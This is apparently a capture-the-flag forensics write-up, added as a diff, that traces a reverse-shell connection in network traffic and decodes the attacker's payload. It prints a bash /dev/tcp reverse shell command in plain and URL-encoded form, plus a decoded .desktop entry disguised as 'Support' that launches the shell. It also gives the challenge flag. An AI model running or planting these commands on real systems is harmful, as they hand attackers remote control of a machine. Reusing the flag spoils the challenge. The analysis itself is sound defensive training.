@@ -1,0 +1,29 @@
+# Track and follow the HTTP/ TCP flow
+# Keep the cyberchef online tool handy
+
+# Common mode of attack is to executed a remote bash shell and establish a 
+TCP port and start sending commands. 
+%60bash%20-c%20%22bash%20-i%20-p%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F5912%200%3E%261%22%60%00
+
+`bash -c "bash -i -p >& /dev/tcp/172.17.0.1/5912 0>&1"
+
+#cyberchef
+tcp.port == 5912 # Wireshark
+
+"W0Rlc2t0b3AgRW50cnldClR5cGU9QXBwbGljYXRpb24KTmFtZT1TdXBwb3J0CkV4ZWM9YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTcuMC4xLzU5MTIgMD4mMSIKQ29tbWVudD1TRlJDZTJJeGRHSjFZMnN6ZERWZmNIVmliREZqWDNJemNEQnpYMmN3WDJKeWNuSWhJWDBLCg==" | base64 -d
+
+[Desktop Entry]
+Type=Application
+Name=Support
+Exec=bash -c "bash -i >& /dev/tcp/172.17.0.1/5912 0>&1"
+Comment=SFRCe2IxdGJ1Y2szdDVfcHVibDFjX3IzcDBzX2cwX2JycnIhIX0K
+
+
+Look at the comment, try a bash decode base 64
+HTB{b1tbuck3t5_publ1c_r3p0s_g0_brrr!!}
+
+
+
+# So,Find to which port the tcp connections is open
+
+# 
